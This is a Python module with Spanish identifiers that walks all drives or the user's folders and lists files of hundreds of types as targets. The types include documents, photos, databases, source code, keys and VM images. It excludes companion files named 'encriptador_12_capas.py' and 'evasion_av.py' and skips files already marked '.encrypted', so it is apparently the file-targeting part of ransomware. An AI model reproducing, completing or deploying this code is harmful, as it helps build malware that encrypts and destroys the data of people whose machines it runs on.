import os
import platform
import ctypes
from collections import defaultdict


def es_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def escanear_sistema():
    sistema = platform.system()
    admin = es_admin()
    extensiones = {
        '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
        '.odt', '.ods', '.odp', '.rtf', '.tex', '.wpd', '.wps', '.pages',
        '.numbers', '.key', '.odg', '.odf', '.ott', '.ots', '.otp', '.oth',
        '.odm', '.sxw', '.stw', '.sxc', '.stc', '.sxi', '.sti', '.sxd', '.std',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico', '.tif',
        '.tiff', '.webp', '.psd', '.ai', '.eps', '.raw', '.cr2', '.nef',
        '.orf', '.sr2', '.heic', '.indd', '.cdr', '.sketch', '.xcf', '.kra',
        '.ora', '.exr', '.dds', '.tga', '.pcx', '.pict', '.pct', '.sgi', '.rgb',
        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v',
        '.mpg', '.mpeg', '.3gp', '.f4v', '.swf', '.vob', '.ogv', '.m2ts',
        '.mts', '.ts', '.divx', '.xvid', '.rm', '.rmvb', '.asf', '.m2v',
        '.svi', '.3g2', '.mxf', '.roq', '.nsv', '.yuv',
        '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus',
        '.ape', '.alac', '.aiff', '.mid', '.midi', '.amr', '.ac3', '.dts',
        '.mka', '.mp2', '.mpa', '.ra', '.tta', '.voc', '.vox', '.wv',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.cab',
        '.iso', '.dmg', '.pkg', '.deb', '.rpm', '.tgz', '.tbz2', '.lz',
        '.lzma', '.z', '.arj', '.ace', '.zipx', '.lha', '.lzh', '.zoo',
        '.arc', '.pak', '.sit', '.sitx', '.sea', '.shar', '.uue', '.uu',
        '.sql', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf',
        '.pdb', '.frm', '.myd', '.myi', '.ibd', '.sqlitedb', '.db3',
        '.fdb', '.gdb', '.nsf', '.wdb', '.dat', '.fp7', '.fmp12',
        '.csv', '.json', '.xml', '.html', '.css', '.js', '.php', '.py',
        '.java', '.c', '.cpp', '.h', '.hpp', '.cs', '.go', '.rb', '.pl',
        '.swift', '.kt', '.rs', '.lua', '.r', '.m', '.vb', '.asp', '.aspx',
        '.jsp', '.scala', '.groovy', '.dart', '.ts', '.tsx', '.jsx',
        '.vue', '.sass', '.scss', '.less', '.coffee', '.ejs', '.pug',
        '.haml', '.slim', '.erb', '.hbs', '.mustache', '.twig', '.blade',
        '.sol', '.asm', '.s', '.pas', '.pp', '.inc', '.ino', '.pde',
        '.sh', '.bash', '.zsh', '.fish', '.bat', '.cmd', '.ps1', '.psm1',
        '.vbs', '.vba', '.ahk', '.au3',
        '.exe', '.msi', '.dll', '.sys', '.scr', '.gadget',
        '.app', '.apk', '.ipa', '.dmg', '.pkg', '.run',
        '.bin', '.out', '.elf', '.com',
        '.jar', '.war', '.ear', '.class', '.pyc', '.pyo', '.pyd', '.so',
        '.dylib', '.o', '.a', '.lib', '.ocx', '.cpl', '.drv', '.efi',
        '.ini', '.cfg', '.conf', '.config', '.yaml', '.yml', '.toml',
        '.properties', '.env', '.editorconfig', '.htaccess', '.gitignore',
        '.dockerignore', '.npmignore', '.eslintrc', '.prettierrc', '.babelrc',
        '.log', '.bak', '.tmp', '.temp', '.cache', '.old', '.orig',
        '.swp', '.swo', '.DS_Store', '.localized', '.thumbs', '.lnk',
        '.vhd', '.vhdx', '.vmdk', '.vdi', '.qcow2', '.img', '.ova', '.ovf',
        '.vmx', '.vmem', '.vmsn', '.vmsd', '.nvram', '.vbox', '.hdd',
        '.cer','.crt', '.pem', '.key', '.pfx', '.p12', '.p7b', '.der',
        '.jks', '.keystore', '.pgp', '.gpg', '.asc', '.p7c', '.spc', '.p7r',
        '.eml', '.msg', '.pst', '.ost', '.mbox', '.emlx', '.mbx', '.dbx',
        '.epub', '.mobi', '.azw', '.azw3', '.fb2', '.lit', '.lrf', '.cbr',
        '.cbz', '.cb7', '.cbt', '.cba', '.djvu', '.djv', '.ibook',
        '.dwg', '.dxf', '.skp', '.blend', '.max', '.3ds', '.obj', '.fbx',
        '.stl', '.step', '.stp', '.iges', '.igs', '.sat', '.sldprt', '.sldasm',
        '.slddrw', '.ipt', '.iam', '.idw', '.prt', '.asm', '.drw', '.catpart',
        '.catproduct', '.cgr', '.3dm', '.rvt', '.rfa', '.rte', '.rft'
    }
    if admin:
        evitar_parcial = set()
    else:
        evitar_parcial = {
            'Windows\\System32', 'Windows\\SysWOW64', 'Windows\\WinSxS',
            'Program Files\\Windows', 'Program Files (x86)\\Windows',
            '$Recycle.Bin', 'python_portable', 'AppData\\Local\\Temp',
            'AppData\\Local\\Microsoft\\Windows\\INetCache',
            'AppData\\Local\\Microsoft\\Windows\\WebCache'
        }
    archivos_app = {'launcher.py', 'rutas.py', 'encriptador_12_capas.py', 'evasion_av.py', 'launcher.bat', 'launcher.sh'}
    dir_app = os.path.abspath(os.getcwd())
    archivos_encontrados = []
    contador_ext = defaultdict(int)
    total = 0
    if sistema == "Windows":
        if admin:
            rutas_escanear = ['C:\\']
            for letra in 'DEFGHIJKLMNOPQRSTUVWXYZ':
                unidad = f'{letra}:\\'
                if os.path.exists(unidad):
                    rutas_escanear.append(unidad)
        else:
            rutas_escanear = [
                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Desktop'),
                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Documents'),
                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Downloads'),
                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Pictures'),
                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Videos'),
                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Music'),
                'C:\\Users', 'D:\\', 'E:\\', 'F:\\'
            ]
    else:
        rutas_escanear = ['/home', '/']
    for ruta_base in rutas_escanear:
        if not os.path.exists(ruta_base):
            continue
        try:
            for root, dirs, files in os.walk(ruta_base):
                if not admin:
                    debe_excluir = False
                    for carpeta_exc in evitar_parcial:
                        if carpeta_exc in root:
                            debe_excluir = True
                            dirs[:] = []
                            break
                    if debe_excluir:
                        continue
                root_abs = os.path.abspath(root)
                if root_abs == dir_app:
                    dirs[:] = []
                    continue
                for archivo in files:
                    try:
                        total += 1
                        if archivo.lower() in [x.lower() for x in archivos_app]:
                            continue
                        if archivo.endswith('.encrypted'):
                            continue
                        ext = os.path.splitext(archivo)[1].lower()
                        ruta_completa = os.path.join(root, archivo)
                        incluir = False
                        if ext in extensiones:
                            incluir = True
                        elif ext == '':
                            incluir = True
                            ext = '[sin_ext]'
                        if incluir:
                            archivos_encontrados.append(ruta_completa)
                            contador_ext[ext] += 1
                    except:
                        continue
        except:
            continue
    return archivos_encontrados, contador_ext, total
